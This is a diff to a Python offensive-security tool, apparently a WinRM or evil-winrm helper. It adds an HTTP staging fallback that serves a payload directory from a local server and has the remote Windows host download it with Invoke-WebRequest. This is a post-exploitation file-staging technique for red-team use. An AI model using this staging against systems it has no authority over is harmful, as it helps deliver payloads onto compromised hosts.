@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import base64
+import os
 import re
 import subprocess
 from pathlib import Path
@@ -353,6 +354,40 @@ def _upload_via_evil_winrm_builtin(
     return _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size)
 
 
+def _upload_via_http(
+    client: WinRMClient,
+    data: bytes,
+    remote_path: str,
+    *,
+    local_path: Path,
+    http_fetch_host: str,
+    http_port: int = _DEFAULT_HTTP_PORT,
+    timeout: int = _UPLOAD_TIMEOUT_MAX,
+) -> bool:
+    """Stage payload via a local HTTP server and fetch with Invoke-WebRequest."""
+    from http.server import HTTPServer, SimpleHTTPRequestHandler
+    from threading import Thread
+
+    local_dir = local_path.parent.resolve()
+    orig_dir = Path.cwd()
+    os.chdir(local_dir)  # server serves from payload dir
+    server = HTTPServer((http_fetch_host, http_port), SimpleHTTPRequestHandler)
+    thread = Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    try:
+        remote_ps = remote_path.replace("'", "''")
+        safe_url = f"http://{http_fetch_host}:{http_port}/{local_path.name}".replace("'", "''")
+        client.execute(
+            f"Invoke-WebRequest -Uri '{safe_url}' -OutFile '{remote_ps}' -UseBasicParsing",
+            shell="powershell",
+            timeout=timeout,
+        )
+        return remote_file_ok(client, remote_path, expected_size=len(data))
+    finally:
+        os.chdir(orig_dir)
+        server.shutdown()
+
+
 def upload_file(
     client: WinRMClient,
     local_path: Path,
@@ -398,6 +433,13 @@ def upload_file(
         http_fetch_host=http_fetch_host,
         http_port=http_port,
     )
+    if http_fetch_host:
+        print_info("automatic upload failed — trying HTTP staging fallback")
+        if _upload_via_http(
+            client, data, remote_path, local_path=local_path, http_fetch_host=http_fetch_host, http_port=http_port
+        ):
+            print_success(f"upload OK — HTTP staging ({expected_size} bytes)")
+            return
     print_error("automatic upload failed — use interactive evil-winrm (builtin upload):")
     for line in manual.splitlines():
         print_error(f"  {line}")
